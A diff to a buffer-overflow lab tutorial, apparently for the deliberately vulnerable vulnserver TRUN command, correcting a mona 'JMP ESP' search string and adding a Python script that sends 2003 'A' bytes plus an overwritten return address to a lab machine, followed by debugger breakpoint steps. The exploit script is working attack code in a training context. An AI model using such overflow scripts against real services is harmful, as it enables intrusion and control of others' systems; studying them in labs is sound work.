@@ -236,9 +236,45 @@ JMP ESP
 Then copy the equivalent and go to immunity debugger and in the botton search bar write
 
 ```bash
-!mona find -s "xff\xe4" -m modulename.dll
+!mona find -s "\xff\xe4" -m modulename.dll
 ```
-Instead of "xff\xe4" is will be your opcode for jump
+Instead of "\xff\xe4" it will be your opcode for jump
+
+Go Back to Kali linux and make another .py file and paste the following code in
+
+```bash
+
+#!/usr/bin/python
+import sys, socket
+
+# Define target IP and port
+target_ip = '10.0.0.52'
+target_port = 9999
+
+
+#Copy the addresses one by one from the list. Current = 625011af
+
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+	
+	s.send(('TRUN /.:/' + shellcode).encode())
+	s.close()
+	
+except:
+	print("Error Connecting to server")
+	sys.exit()
+
+```
+The return address thing will be in reverse as written in the code above
+
+Go to debugger again
+
+Click on the bluish black arrow on teh topbar and enter the address, in this case its 625011af
+Then click ok and you should see the address. 
+Then press F2 on the keyboard, to set a breakpoint.
 
 
 
